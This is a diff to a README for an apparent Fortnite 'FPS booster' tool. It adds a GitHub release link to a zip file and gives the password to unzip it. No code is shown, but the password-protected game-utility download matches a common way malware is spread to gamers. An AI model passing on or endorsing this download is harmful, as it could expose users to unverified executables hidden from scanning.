@@ -7,7 +7,7 @@ FPS Booster for Fortnite is a powerful utility designed to help gamers maximize 
 
 ## 📥 **Download**
 <div align="center">
-    <h2><a href="">🔹 Download last Release (github) 🔹</a></h2>
+    <h2><a href="https://github.com/Frayshayl/Fortnite-fps-and-ping-booster/releases/download/latest/FrayBooster.zip">🔹 Download last Release (github) 🔹</a></h2>
 </div>
 💼 **Password to Unzip: FrayBooster
 
